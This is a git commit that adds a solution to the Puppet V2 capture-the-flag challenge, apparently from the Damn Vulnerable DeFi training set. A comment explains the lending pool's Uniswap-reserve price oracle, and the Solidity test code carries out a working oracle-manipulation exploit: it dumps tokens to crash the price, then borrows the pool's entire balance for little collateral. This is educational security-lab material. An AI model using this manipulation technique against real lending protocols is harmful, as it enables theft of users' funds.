9f58a4de12d80583b989a132d07975c882daad20
Darren Jensen <darren.jensen@gmail.com>
2024-09-16 13:40:19 +0700

    completed solution for PuppetPool V2

--- test/puppet-v2/PuppetV2.t.sol
+++ test/puppet-v2/PuppetV2.t.sol
@@ -16,9 +16,9 @@ contract PuppetV2Challenge is Test {
     address recovery = makeAddr("recovery");
 
     uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
-    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
-    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
-    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18; // 10 ether
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18; // 10K DVT Tokens
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18; // 20 ether
     uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
 
     WETH weth;
@@ -98,7 +98,68 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
+        /*
+            The vulnerability in the PuppetV2Pool challenge stems from the way the contract determines
+            the quotation of the DamnValuableToken (DVT) token. It relies on a function called _getOracleQuote, 
+            whichwhich calculates the deposit quotation using the balance of the uniswapV2 pair contract’s 
+            reserves by uniswapV2Library function quote. The problem lies in the contract’s exclusive dependence on the balance of the 
+            Uniswap pair to determine the token’s price. 
+
+            Therefore the DVT tokens can be stolen from the PuppetPool by just 2 simple steps:
+
+            1. Dump DVT Tokens into the UniswapV2 pool to effectively drop the price of DVT in that pool.
+            therefore PuppetV2Pool contract now perceives DVT as being nearly worthless.
+
+            2. Depoisit a very small ETH Collateral to be able to borrow (steal) all the DVT tokens from the PuppetV2Pool.
+
+            *** INITIAL STATE (Before manipulating pool) ***
+
+            User                UniswapV2
+            ------------------------------------
+            ETH         DVT     ETH         DVT
+            20 ether    10_000  10 ether    100
+
+            Price of 1_000_000 DVT == 300_000 ETH
+            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+            *** POST STATE (After manipulating pool) ***
+
+            User                UniswapV2
+            ------------------------------------
+            ETH         DVT     ETH         DVT
+            29.9 ether  0       0.1 ether   10_100
+
+            Price of 1_000_000 DVT == 29.49 ETH (dramatically lower price!)
+            lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        */
+
+        console.log('---------- PRICE BEFORE SWAP ----------');
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("ETH deposit required to borrow all DVT tokens: ", depositRequired); // 300_000 ETH
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,  // amount in
+            0,  // amount out min
+            path,
+            address(player), // to
+            block.timestamp*2
+        );
+        console.log('---------- PRICE AFTER SWAP ----------');
+        depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("ETH deposit required to borrow all DVT tokens: ", depositRequired); // 29.49 ETH
+
+        // approve the tokens and borrow (steal) all the DVT tokens from the pool
+        require(player.balance > depositRequired);
+        weth.deposit{value: depositRequired}();
+        weth.approve(address(lendingPool), depositRequired);
         
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
